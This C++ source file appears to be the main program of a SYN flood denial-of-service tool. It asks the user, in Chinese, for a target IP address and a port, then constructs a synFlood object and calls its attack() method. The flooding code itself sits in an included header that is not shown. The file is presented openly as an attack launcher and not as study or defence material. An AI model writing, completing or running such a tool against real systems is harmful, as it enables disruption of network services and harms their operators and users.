#include<iostream>
#include<string>
#include"synFlood.h"

using std::cout;
using std::endl;
using std::cin;
using std::string;

int main()
{
    string dest;
    int port;

    std::cout<<"输入目的ip>";
    cin>>dest;
    std::cout<<"输入端口port>";
    cin>>port;
    
    synFlood sf(dest,port);
    sf.attack();
    return 0;
}

